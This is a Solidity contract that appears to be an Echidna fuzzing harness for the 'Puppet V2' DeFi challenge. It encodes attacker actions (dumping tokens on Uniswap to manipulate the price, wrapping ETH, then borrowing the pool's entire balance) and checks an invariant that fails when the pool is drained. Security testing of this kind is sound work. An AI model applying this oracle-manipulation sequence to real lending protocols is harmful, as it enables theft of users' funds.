pragma solidity ^0.7.0;

import "../WETH9.sol";

/*
Contract interfaces - only functions that are used later on are exposed.
Argument names aren't necessary, but are added for clarity.
*/
interface IERC20 
{
    function balanceOf(address account) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPuppetV2Pool
{
    function borrow(uint256 borrowAmount) external;
}

interface IUniswapV2Router02
{
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) 
        external returns (uint[] memory amounts);
}

contract PuppetV2PoolEchidna
{
    // deployed contracts
    IERC20 token = IERC20(0x1dC4c1cEFEF38a777b15aA20260a54E584b16C48);
    IPuppetV2Pool lendingPool = IPuppetV2Pool(0x25B8Fe1DE9dAf8BA351890744FF28cf7dFa8f5e3);
    WETH9 weth = WETH9(0x1D7022f5B17d2F8B695918FB48fa1089C9f85401);
    IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(0x0B1ba0af832d7C05fD64161E0Db78E85978E8082);

    uint constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000 ether;

    // contract will receive 20 ETH at the contract creation time
    constructor() payable
    {
        
    }

    /*
    The following functions reflect what actions the attacker can make. 
    Random values provided by Echidna are changed to fit a relevant interval.
    For example, there is no sense in trying to send more tokens than we actually have.
    */
    function swapExactTokensForETH(uint amount) public
    {
        amount = _between(amount, 0, token.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        token.approve(address(uniswapRouter), amount);
        uniswapRouter.swapExactTokensForETH(amount, 0, path, address(this), type(uint).max);
    }

    function borrow() public
    {
        uint amount = token.balanceOf(address(lendingPool));
        weth.approve(address(lendingPool), weth.balanceOf(address(this)));
        lendingPool.borrow(amount);
    }

    function getWeth() public
    {
        uint amount = address(this).balance;
        weth.deposit{ value: amount }();
    }


    // utility function; returns a number from the interval [low + 1, high] based on val
    function _between(uint val, uint low, uint high) internal pure returns (uint)
    {
        return low + (val % (high - low + 1)) + 1;
    }

    // this fails when lendingPool has no tokens left and the attacker has at least POOL_INITIAL_TOKEN_BALANCE tokens
    function echidna_test_token_balance() public returns (bool)
    {
        return token.balanceOf(address(lendingPool)) > 0 || token.balanceOf(address(this)) < POOL_INITIAL_TOKEN_BALANCE;
    }

    // needed for uniswapRouter.swapExactTokensForETH
    receive() payable external
    {

    }
}
